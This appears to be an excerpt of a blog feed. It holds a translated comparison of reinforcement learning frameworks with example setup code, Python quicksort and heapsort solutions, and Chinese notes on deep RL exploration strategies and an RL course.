<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">rng = np.random.RandomState(<span class="number">123456</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Instantiate environment ---</span></span><br><span class="line">env = Toy_env(rng)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Instantiate qnetwork ---</span></span><br><span class="line">qnetwork = MyQNetwork(</span><br><span class="line">    environment=env,</span><br><span class="line">    random_state=rng)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Instantiate agent ---</span></span><br><span class="line">agent = NeuralAgent(</span><br><span class="line">    env,</span><br><span class="line">    qnetwork,</span><br><span class="line">    random_state=rng)</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Bind controllers to the agent ---</span></span><br><span class="line"><span class="comment"># Before every training epoch, we want to print a summary of the agent&#x27;s epsilon, discount and</span></span><br><span class="line"><span class="comment"># learning rate as well as the training epoch number.</span></span><br><span class="line">agent.attach(bc.VerboseController())</span><br><span class="line"></span><br><span class="line"><span class="comment"># During training epochs, we want to train the agent after every action it takes.</span></span><br><span class="line"><span class="comment"># Plus, we also want to display after each training episode (!= than after every training) the average bellman</span></span><br><span class="line"><span class="comment"># residual and the average of the V values obtained during the last episode.</span></span><br><span class="line">agent.attach(bc.TrainerController())</span><br><span class="line"></span><br><span class="line"><span class="comment"># All previous controllers control the agent during the epochs it goes through. However, we want to interleave a</span></span><br><span class="line"><span class="comment"># &quot;test epoch&quot; between each training epoch. We do not want these test epoch to interfere with the training of the</span></span><br><span class="line"><span class="comment"># agent. Therefore, we will disable these controllers for the whole duration of the test epochs interleaved this</span></span><br><span class="line"><span class="comment"># way, using the controllersToDisable argument of the InterleavedTestEpochController. The value of this argument</span></span><br><span class="line"><span class="comment"># is a list of the indexes of all controllers to disable, their index reflecting in which order they were added.</span></span><br><span class="line">agent.attach(bc.InterleavedTestEpochController(</span><br><span class="line">    epoch_length=<span class="number">500</span>,</span><br><span class="line">    controllers_to_disable=[<span class="number">0</span>, <span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Run the experiment ---</span></span><br><span class="line">agent.run(n_epochs=<span class="number">100</span>, epoch_length=<span class="number">1000</span>)</span><br></pre></td></tr></table></figure>
<p>Here we are instantiating an environment, creating the Q-Learning algorithm and creating the agent that uses that algorithm. Next we use the <code>.attach()</code> function on the agent to appen all of these <code>Controller</code>s we have been talking about. They add logging and interleave training periods and testing periods.</p>
<p>If we wanted to edit any of this we just need to reimplement the piece that we’re interested in. Great!</p>
<p><img src="https://WinderResearch.com/a-comparison-of-reinforcement-learning-frameworks-dopamine-rllib-keras-rl-coach-trfl-tensorforce-coach-and-more/./deer.png" alt=""></p>
<p>The only issue was that the toy example didn’t work! I’m not sure why, but it’s probably something silly. The training values looked a little weird in that the test score was always 0, and the training loss increased over time. Maybe it got stuck. Not sure. I’m sure it’s something silly.</p>
<h2 id="Garage"><a href="#Garage" class="headerlink" title="Garage"></a><a href="https://github.com/rlworkgroup/garage">Garage</a></h2><p><img src="https://img.shields.io/github/stars/rlworkgroup/garage.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/rlworkgroup/garage.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/rlworkgroup/garage.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/rlworkgroup/garage.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/rlworkgroup/garage.svg?style=flat-square" alt=""></p>
<p>Garage is a follow-on from <a href="https://github.com/rll/rllab">rllab</a> with the same aims, but just community, rather than individual support. The <a href="https://rlgarage.readthedocs.io/en/latest/index.html">documentation</a> is a little sparse. For instance, it doesn’t highlight that it implements a <a href="https://github.com/rlworkgroup/garage/tree/master/src/garage/tf/algos">large number of algorithms</a>. And also a <a href="https://github.com/rlworkgroup/garage/tree/master/src/garage/tf/policies">huge number of policies</a>. In fact, there’s pretty much everything you could ever need in this <a href="https://github.com/rlworkgroup/garage/tree/master/src/garage/tf">quiet little directory</a>.</p>
<p>But it is very tightly coupled to Tensorflow, if that is a problem for you.</p>
<p>There’s so much functionality here, but it is completely hidden. The code is reasonably well documented, but it’s not exposed. You have to dig through it to find it.</p>
<p>Again there is no pip installer. Just some custom conda install and some <code>apt-get</code> dependencies.</p>
<p>So I can see that there is a huge amount of value in the algorithm implementations, but I’m going to skip the getting started this time.</p>
<h2 id="Surreal"><a href="#Surreal" class="headerlink" title="Surreal"></a><a href="https://github.com/SurrealAI/surreal">Surreal</a></h2><p><img src="https://img.shields.io/github/stars/SurrealAI/surreal.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/SurrealAI/surreal.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/SurrealAI/surreal.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/SurrealAI/surreal.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/SurrealAI/surreal.svg?style=flat-square" alt=""></p>
<p>Surreal is a suite of applications. Foremost it is an RL framwork. But to make sure they don’t build just another framework, they also provide a new Robotics simulator, an orchestrator, a cloud infrastructure provisioner and a protocol for distributed computing. It comes from Stanford, hence academic in approach and use-case, hence the default use of PyTorch.</p>
<p>I’m all for the framework and the simulator, but it would have been easier if they had just used standard industrial components for the orchestrator (Kubernetes), infrastructure (Terraform) and protocol (Kafka/Nats/etc/etc). Those problems have already been solved. (Correction haha. Once I dug into the getting started guide, it became clear that they are using Kubernetes and Terraform. Great choices! 😂)</p>
<p>The robotics simulator is a collection of <a href="http://mujoco.org/">MuJoCo</a> simulations. So that is a great addition to the Environment list (despite the licensing terms of MuJoCo).</p>
<p>The RL framework needs a big of coaxing into life. It’s another combination of apt-get’s and conda installs.</p>
<p>Oh wow. I’ve just noticed that they’ve disabled the Github issue tracker. And there’s an explict copyright notice that belongs to each of the authors. OK, so this isn’t even open source.</p>
<p>But the robosuite is MIT licenced?</p>
<p>Very strange. Stopping here due to the lack of issues and werid licensing.</p>
<h2 id="RLgraph"><a href="#RLgraph" class="headerlink" title="RLgraph"></a><a href="https://github.com/rlgraph/rlgraph">RLgraph</a></h2><p><img src="https://img.shields.io/github/stars/rlgraph/rlgraph.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/rlgraph/rlgraph.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/rlgraph/rlgraph.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/rlgraph/rlgraph.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/rlgraph/rlgraph.svg?style=flat-square" alt=""></p>
<p>So let’s start by saying RLgraph has a whopping number of commits. They’re running at 4000 commits per year. Compare that to OpenAI Gym at just 221. Somebody needs to tell these five people to have a holiday. And it’s only a year old. I can only imagine that it is being used full time.</p>
<p>But anyway. Like other frameworks they are focusing on scalability. But interestingly they are mapping directly to both Tensorflow and Pytorch. They are not using Keras. So that must have been a massive challenge in itself. It looks like they’ve used the <a href="##RLLib\ via\ ray-project">Ray project</a> to distribute work like <a href="http://localhost:1313/a-comparison-of-reinforcement-learning-frameworks/#slm-lab-https-github-com-kengz-slm-lab">SLM-Lab</a>.</p>
<p>But hurray! They have a pip installer. The configuration of the agents is controlled via JSON. But only the configuration. Not the construction.</p>
<p>I’ve just read that the authors <a href="https://rlgraph.github.io/rlgraph/2019/01/04/introducing-rlgraph.html">also worked on Tensorforce</a>, which explains some of the de ja voux I have been feeling. And I love that my complaints in Tensorforce, about how the underlying DL framework often leaks into the RL implementation code, have been addressed in RLgraph. I get the feeling that they’ve been listening to me rant to my bored wife.</p>
<blockquote>
<p>Separating spaces of tensors from logical composition enables us to reuse components without ever manually dealing with incompatible shapes again. Note how the above code does not contain any framework-specific notions but only defines an input dataflow from a set of spaces.</p>
</blockquote>
<p>Just want I always wanted. And this is achieved with <a href="https://rlgraph.readthedocs.io/en/latest/spaces.html">an abstraction of inputs and outputs</a>. Other than that, the API is familiar. An <a href="https://rlgraph.readthedocs.io/en/latest/environments.html"><code>Environment</code></a> and an <a href="https://github.com/rlgraph/rlgraph/blob/master/rlgraph/agents/agent.py#L42"><code>Agent</code></a>. There’s a very cool <a href="https://rlgraph.readthedocs.io/en/latest/components.html"><code>Component</code></a> class that abstracts the DL building blocks.</p>
<p>However, there are abstractions that are missing here. There’s no Policy abstractions. No exploration abstractions. Basically all the nice abstractions from <a href="##coach">Nervana Systems Coach</a>.</p>
<p>But I’m still pretty impressed.</p>
<h3 id="Getting-Started-11"><a href="#Getting-Started-11" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>I altered the cartpole getting started example a little to use the SingleThreadedWorker and enable rendering on the environment to get the video output. Other than that it all looks very familiar.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> rlgraph.agents <span class="keyword">import</span> DQNAgent</span><br><span class="line"><span class="keyword">from</span> rlgraph.environments <span class="keyword">import</span> OpenAIGymEnv</span><br><span class="line"><span class="keyword">from</span> rlgraph.execution <span class="keyword">import</span> SingleThreadedWorker</span><br><span class="line"></span><br><span class="line">environment = OpenAIGymEnv(<span class="string">&#x27;CartPole-v0&#x27;</span>, monitor=<span class="string">&quot;.&quot;</span>, monitor_video=<span class="number">1</span>, visualize=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create from .json file or dict, see agent API for all</span></span><br><span class="line"><span class="comment"># possible configuration parameters.</span></span><br><span class="line">agent = DQNAgent.from_file(</span><br><span class="line">  <span class="string">&quot;configs/dqn_cartpole.json&quot;</span>,</span><br><span class="line">  state_space=environment.state_space,</span><br><span class="line">  action_space=environment.action_space</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">episode_returns = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">episode_finished_callback</span>(<span class="params">episode_return, duration, timesteps, **kwargs</span>):</span></span><br><span class="line">  episode_returns.append(episode_return)</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(episode_returns) % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">    print(<span class="string">&quot;Episode &#123;&#125; finished: reward=&#123;:.2f&#125;, average reward=&#123;:.2f&#125;.&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">      <span class="built_in">len</span>(episode_returns), episode_return, np.mean(episode_returns[-<span class="number">10</span>:])</span><br><span class="line">    ))</span><br><span class="line"></span><br><span class="line">worker = SingleThreadedWorker(env_spec=<span class="keyword">lambda</span>: environment, agent=agent, render=<span class="literal">True</span>, worker_executes_preprocessing=<span class="literal">False</span>,</span><br><span class="line">                              episode_finish_callback=episode_finished_callback)</span><br><span class="line">print(<span class="string">&quot;Starting workload, this will take some time for the agents to build.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use exploration is true for training, false for evaluation.</span></span><br><span class="line">worker.execute_timesteps(<span class="number">1000</span>, use_exploration=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<h2 id="Simple-RL"><a href="#Simple-RL" class="headerlink" title="Simple RL"></a><a href="https://github.com/david-abel/simple_rl">Simple RL</a></h2><p><img src="https://img.shields.io/github/stars/david-abel/simple_rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/issues-closed-raw/david-abel/simple_rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/contributors/david-abel/simple_rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/last-commit/david-abel/simple_rl.svg?style=flat-square" alt=""><br><img src="https://img.shields.io/github/commit-activity/y/david-abel/simple_rl.svg?style=flat-square" alt=""></p>
<p>And finally, simple_rl. All other frameworks state that their goals are performance/scalability or modularity or repeatability. None of them set out to be simple. This is where simple_rl steps in. Built from the ground up to be as simple as possible. It only has two dependencies, <code>numpy</code> and <code>matplotlib</code>. And that’s only if you want to plot the results. Basically it’s just <code>numpy</code>. It has <a href="https://github.com/david-abel/simple_rl#installation">pip installer</a>. The <a href="https://david-abel.github.io/simple_rl/docs/index.html">documentation is non-existant</a> but that’s ok, who needs docs? ;-)</p>
<p>It presents a familiar collection of abstractions: an <a href="https://github.com/david-abel/simple_rl/blob/master/simple_rl/agents/AgentClass.py"><code>agent</code></a>, an <a href="https://github.com/david-abel/simple_rl/blob/master/simple_rl/experiments/ExperimentClass.py"><code>experiment</code></a>, an environment that is called an <a href="https://github.com/david-abel/simple_rl/blob/master/simple_rl/mdp/MDPClass.py"><code>mdp</code></a>. The framework also abstracts <a href="https://github.com/david-abel/simple_rl/tree/master/simple_rl/abstraction">other parts of the model</a> like an action, feature, state. And a planning class that implements the strategies for next actions. It is still very modular, but some of the naming convensions should be changed to match the other frameworks (standardisation).</p>
<p>So it is becoming apparent that “simple” doesn’t necesarily mean easy to understand. Generally, more abstraction makes it harder to understand. Simple in this case is “ease of use”. I think that’s a shame. I really was hoping for simplicity in terms of undertanding. But it looks like it is aiming to compete with some of the more complex frameworks; <a href="https://github.com/david-abel/simple_rl#in-development">Deep RL support with PyTorch is in development</a>.</p>
<p>There continues to be a gap in the framework market for a very simple, understandable RL framework. And I’m not sure why this framework has so few stars compared to the rest. Presumably because it’s not bootstrapping on the popularity of other DL frameworks, like many of the other frameworks.</p>
<h3 id="Getting-Started-12"><a href="#Getting-Started-12" class="headerlink" title="Getting Started"></a>Getting Started</h3><p>It should have been simple. But deep inside the code there are a few lines that force the <code>Matplotlib</code> to use the <code>TkAgg</code> backend. I tried to get <code>TkAgg</code> working in the Notebook but could not. It is designed for graphical desktop use, so you can imagine that it is not straightforward. I created an <a href="https://github.com/david-abel/simple_rl/issues/40">issues here</a>. It should be a simple fix.</p>
<p>If/When it works, it should be as simple as something like:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> simple_rl.agents <span class="keyword">import</span> QLearningAgent, RandomAgent, RMaxAgent</span><br><span class="line"><span class="keyword">from</span> simple_rl.tasks <span class="keyword">import</span> GridWorldMDP</span><br><span class="line"><span class="keyword">from</span> simple_rl.run_experiments <span class="keyword">import</span> run_agents_on_mdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup MDP.</span></span><br><span class="line">mdp = GridWorldMDP(width=<span class="number">4</span>, height=<span class="number">3</span>, init_loc=(<span class="number">1</span>, <span class="number">1</span>), goal_locs=[(<span class="number">4</span>, <span class="number">3</span>)], lava_locs=[(<span class="number">4</span>, <span class="number">2</span>)], gamma=<span class="number">0.95</span>, walls=[(<span class="number">2</span>, <span class="number">2</span>)], slip_prob=<span class="number">0.05</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Setup Agents.</span></span><br><span class="line">ql_agent = QLearningAgent(actions=mdp.get_actions())</span><br><span class="line">rmax_agent = RMaxAgent(actions=mdp.get_actions())</span><br><span class="line">rand_agent = RandomAgent(actions=mdp.get_actions())</span><br><span class="line"></span><br><span class="line"><span class="comment"># Run experiment and make plot.</span></span><br><span class="line">run_agents_on_mdp([ql_agent, rmax_agent, rand_agent], mdp, instances=<span class="number">5</span>, episodes=<span class="number">50</span>, steps=<span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>This trains a few different agents and produces a reward plot for each. Nice eh! The only thing I would suggest is that there shouldn’t be any environment implementation in simple_rl. That is out of scope. Leave that to Gym-like projects. For example, <a href="https://github.com/maximecb/gym-minigrid">gym-minigrid</a> has an awesome Gridworld implementation.</p>
<h1 id="Google-Rankings"><a href="#Google-Rankings" class="headerlink" title="Google Rankings"></a>Google Rankings</h1><p>Google’s Trends search tool allows you to find out what search queries are the most popular. Unfortunately they only provide relative measures and those change depending on what you are querying. Also, common words often get mixed into other queries. For example, searching for “Facebook Horizon” is mixed with a bunch of unrelated queries about “Forza Horizon 4” and “facebook log in”; clearly this inflates this score and cannot be trusted.</p>
<p>I went through all of these frameworks and found that only two frameworks stood out, openai gym and google dopamine. But even for google dopamine, the related queries were google docs/scholar/translate/etc., so I’m not sure if I can trust this either.</p>
<p>One of the things that stood out to me most was the geographical popularity. OpenAI Gym seemed to be the most popular search term, given that it has a high ranking score and all of the related queries are related to RL. But when you look at the how the ranking alters by geography, China is the country with the most searches.</p>
<p>This strikes me as odd, because <a href="https://en.wikipedia.org/wiki/Google_China">Google is banned in China</a> and so how are they generating these statistics? Are users using VPNs and then searching, and Google is able to recognise that the original traffic is from China?</p>
<h2 id="Don’t-Trust-Google-Trends"><a href="#Don’t-Trust-Google-Trends" class="headerlink" title="Don’t Trust Google Trends"></a>Don’t Trust Google Trends</h2><p>All of this brings me to the conclusion that I can’t trust Google trends at all. OpenAI Gym does seem like the highest ranking RL related framework, which you might expect, but the bulk of that score is coming from China. But Google is blocked in China. Sooo..</p>
<p><a href="https://winderresearch.com/a-comparison-of-reinforcement-learning-frameworks-dopamine-rllib-keras-rl-coach-trfl-tensorforce-coach-and-more/#keras-rl-https-github-com-keras-rl-keras-rl">原文地址</a></p>
]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
      <tags>
        <tag>外文翻译</tag>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title>常见算法搜集</title>
    <url>/2020/03/31/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E6%90%9C%E9%9B%86/</url>
    <content><![CDATA[<p>Leetcode中常用算法的总结</p>
<span id="more"></span>
<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><p><img src="/img/algs/algs.jpg" alt="常见排序算法总结"></p>
<p>相关题目：<a href="https://leetcode-cn.com/problems/sort-an-array">912</a></p>
<h2 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">self, nums, left, right</span>):</span></span><br><span class="line">        pivot = nums[left] <span class="comment"># 在left(l)挖坑</span></span><br><span class="line">        l, r = left, right</span><br><span class="line">        <span class="keyword">while</span> l &lt; r:</span><br><span class="line">            <span class="keyword">while</span> l &lt; r <span class="keyword">and</span> nums[r] &gt;= pivot:</span><br><span class="line">                r -= <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> l &lt; r:</span><br><span class="line">                nums[l] = nums[r] <span class="comment"># 在r挖坑，填l的坑</span></span><br><span class="line">                l += <span class="number">1</span></span><br><span class="line">            <span class="keyword">while</span> l &lt; r <span class="keyword">and</span> nums[l] &lt;= pivot:</span><br><span class="line">                l += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> l &lt; r:</span><br><span class="line">                nums[r] = nums[l] <span class="comment"># 在l挖坑，填r的坑</span></span><br><span class="line">                r -= <span class="number">1</span></span><br><span class="line">        nums[l] = pivot</span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quicksort</span>(<span class="params">self, nums, left, right</span>):</span></span><br><span class="line">        <span class="keyword">if</span> left &lt; right:</span><br><span class="line">            pivot_loc = self.partition(nums, left, right)</span><br><span class="line">            self.quicksort(nums, left, pivot_loc - <span class="number">1</span>)</span><br><span class="line">            self.quicksort(nums, pivot_loc + <span class="number">1</span>, right)</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self, nums: List[<span class="built_in">int</span>]</span>) -&gt; List[int]:</span></span><br><span class="line">        self.quicksort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></figure>
<h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">max_heapify</span>(<span class="params">self, heap, root, heap_len</span>):</span> <span class="comment"># 从root开始，依次与左右节点中较大的值进行交换</span></span><br><span class="line">        p = root</span><br><span class="line">        <span class="keyword">while</span> p * <span class="number">2</span> + <span class="number">1</span> &lt; heap_len:</span><br><span class="line">            l, r = p * <span class="number">2</span> + <span class="number">1</span>, p * <span class="number">2</span> + <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> heap_len &lt;= r <span class="keyword">or</span> heap[r] &lt; heap[l]:</span><br><span class="line">                nex = l</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                nex = r</span><br><span class="line">            <span class="keyword">if</span> heap[p] &lt; heap[nex]:</span><br><span class="line">                heap[p], heap[nex] = heap[nex], heap[p]</span><br><span class="line">                p = nex</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">build_heap</span>(<span class="params">self, heap</span>):</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(heap) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            self.max_heapify(heap, i, <span class="built_in">len</span>(heap))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">heap_sort</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        self.build_heap(nums) <span class="comment"># 构建初始堆，从最后一个叶结点开始向上遍历，每一个节点都保证以自己为根节点的树中自己的值最大</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums) - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            nums[i], nums[<span class="number">0</span>] = nums[<span class="number">0</span>], nums[i] <span class="comment"># 将当前最大值交换到队尾，找到一个元素的正确位置</span></span><br><span class="line">            self.max_heapify(nums, <span class="number">0</span>, i)</span><br><span class="line">            </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        self.heap_sort(nums)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>强化学习中的探索策略</title>
    <url>/2020/06/29/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B8%AD%E7%9A%84%E6%8E%A2%E7%B4%A2%E7%AD%96%E7%95%A5/</url>
    <content><![CDATA[<p><em>Exploration Strategies in Deep Reinforcement Learning (Jun 7, 2020)</em></p>
<p>作者：<a href="https://lilianweng.github.io/lil-log/">Lilian Weng</a></p>
<span id="more"></span>
<h1 id="Classic-Exploration-Strategies"><a href="#Classic-Exploration-Strategies" class="headerlink" title="Classic Exploration Strategies"></a>Classic Exploration Strategies</h1><p>传统探索策略</p>
<ul>
<li>适用于MAB或表格型RL<ul>
<li><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.025ex" xmlns="http://www.w3.org/2000/svg" width="0.919ex" height="1ex" role="img" focusable="false" viewBox="0 -431 406 442"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D716" d="M227 -11Q149 -11 95 41T40 174Q40 262 87 322Q121 367 173 396T287 430Q289 431 329 431H367Q382 426 382 411Q382 385 341 385H325H312Q191 385 154 277L150 265H327Q340 256 340 246Q340 228 320 219H138V217Q128 187 128 143Q128 77 160 52T231 26Q258 26 284 36T326 57T343 68Q350 68 354 58T358 39Q358 36 357 35Q354 31 337 21T289 0T227 -11Z"></path></g></g></g></svg></mjx-container>-greedy</li>
<li>UCB</li>
<li>Boltzmann(softmax) exploration</li>
<li>Thompson sampling</li>
</ul>
</li>
<li>适用于DRL<ul>
<li>Entropy loss term</li>
<li>Noise-based Exploration 在各种地方添加噪声<ul>
<li><a href="https://arxiv.org/abs/1706.10295">Noisy Networks for Exploration</a>(2017)<ul>
<li>NoisyNet在NN权重上基于GD引入扰动</li>
</ul>
</li>
<li><a href="https://arxiv.org/abs/1706.01905">Parameter Space Noise for Exploration</a>(2017)</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="Key-Exploration-Problems"><a href="#Key-Exploration-Problems" class="headerlink" title="Key Exploration Problems"></a>Key Exploration Problems</h1><h2 id="The-Hard-Exploration-Problem"><a href="#The-Hard-Exploration-Problem" class="headerlink" title="The Hard-Exploration Problem"></a>The Hard-Exploration Problem</h2><p>奖励少或者奖励有欺骗性</p>
<h2 id="The-Noisy-TV-Problem"><a href="#The-Noisy-TV-Problem" class="headerlink" title="The Noisy-TV Problem"></a>The Noisy-TV Problem</h2><p>Agent被TV中虚假的不同状态吸引注意力而不去探索真实状态</p>
<h1 id="Intrinsic-Rewards-as-Exploration-Bonuses"><a href="#Intrinsic-Rewards-as-Exploration-Bonuses" class="headerlink" title="Intrinsic Rewards as Exploration Bonuses"></a>Intrinsic Rewards as Exploration Bonuses</h1><p>利用内在奖励解决Hard-Exploration问题</p>
<h2 id="Count-based-Exploration"><a href="#Count-based-Exploration" class="headerlink" title="Count-based Exploration"></a>Count-based Exploration</h2><p>基于计数评估状态的新颖程度</p>
<h3 id="Counting-by-Density-Model"><a href="#Counting-by-Density-Model" class="headerlink" title="Counting by Density Model"></a>Counting by Density Model</h3><ul>
<li>Density model(2016)<h3 id="Counting-after-Hashing"><a href="#Counting-after-Hashing" class="headerlink" title="Counting after Hashing"></a>Counting after Hashing</h3>将高维状态空间用hash（LSH、SimHash）进行映射<h2 id="Prediction-based-Exploration"><a href="#Prediction-based-Exploration" class="headerlink" title="Prediction-based Exploration"></a>Prediction-based Exploration</h2>基于预测来评估模型对环境的熟悉程度<h3 id="Forward-Dynamics"><a href="#Forward-Dynamics" class="headerlink" title="Forward Dynamics"></a>Forward Dynamics</h3></li>
<li>IAC(2007)</li>
<li>ICM(2017)</li>
<li>VIME(2017)<h3 id="Random-Networks"><a href="#Random-Networks" class="headerlink" title="Random Networks"></a>Random Networks</h3>预测任务与环境无关时选择随机任务来辅助探索</li>
<li>DORA(2018)</li>
<li>RND(2018)<ul>
<li>Random Network Distillation<h3 id="Physical-Properties"><a href="#Physical-Properties" class="headerlink" title="Physical Properties"></a>Physical Properties</h3>发现物理环境中隐藏的属性来鼓励探索</li>
</ul>
</li>
</ul>
<h1 id="Memory-based-Exploration"><a href="#Memory-based-Exploration" class="headerlink" title="Memory-based Exploration"></a>Memory-based Exploration</h1><p>引入外部存储解决上述基于奖励的探索方法存在的问题</p>
<h2 id="Episodic-Memory"><a href="#Episodic-Memory" class="headerlink" title="Episodic Memory"></a>Episodic Memory</h2><ul>
<li>NGU(2020)<ul>
<li>Never Give Up</li>
<li>Agent57(2020)<h2 id="Direct-Exploration"><a href="#Direct-Exploration" class="headerlink" title="Direct Exploration"></a>Direct Exploration</h2></li>
</ul>
</li>
<li>Go-Explore(2019)</li>
<li>DTSIL(2019)</li>
<li>policy-based Go-Explore(2020)<h2 id="Q-Value-Exploration"><a href="#Q-Value-Exploration" class="headerlink" title="Q-Value Exploration"></a>Q-Value Exploration</h2></li>
<li>Bootstrapped DQN(2016)<h2 id="Varitional-Options"><a href="#Varitional-Options" class="headerlink" title="Varitional Options"></a>Varitional Options</h2></li>
<li>VIC(2017)</li>
<li>VALOR(2018)</li>
<li>DIAYN(2018)</li>
</ul>
<p><a href="https://lilianweng.github.io/lil-log/2020/06/07/exploration-strategies-in-deep-reinforcement-learning.html">原文地址</a></p>
]]></content>
      <categories>
        <category>强化学习</category>
      </categories>
      <tags>
        <tag>强化学习</tag>
      </tags>
  </entry>
  <entry>
    <title>强化学习纲要笔记</title>
    <url>/2020/05/12/%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E7%BA%B2%E8%A6%81%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>周博磊老师的强化学习纲要课程 10课时</p>
<p><a href="https://space.bilibili.com/511221970/">课程地址</a></p>
<p><a href="https://github.com/zhoubolei/introRL">课程资料</a></p>
<p>May ReinForce Be With You !</p>
<span id="more"></span>
<h1 id="概括与RL基础"><a href="#概括与RL基础" class="headerlink" title="概括与RL基础"></a>概括与RL基础</h1><ul>
<li>RL特点<ul>
<li>试错探索</li>
<li>输入数据有时间关联（非i.i.d）</li>
<li>奖励存在延迟</li>
<li>agent行为影响后续数据</li>
</ul>
</li>
<li>POMDP</li>
<li>Cross Entropy method (CEM)</li>
</ul>
<h1 id="马尔可夫决策过程"><a href="#马尔可夫决策过程" class="headerlink" title="马尔可夫决策过程"></a>马尔可夫决策过程</h1><h2 id="MP-MRP（小船随波逐流）"><a href="#MP-MRP（小船随波逐流）" class="headerlink" title="MP/MRP（小船随波逐流）"></a>MP/MRP（小船随波逐流）</h2><ul>
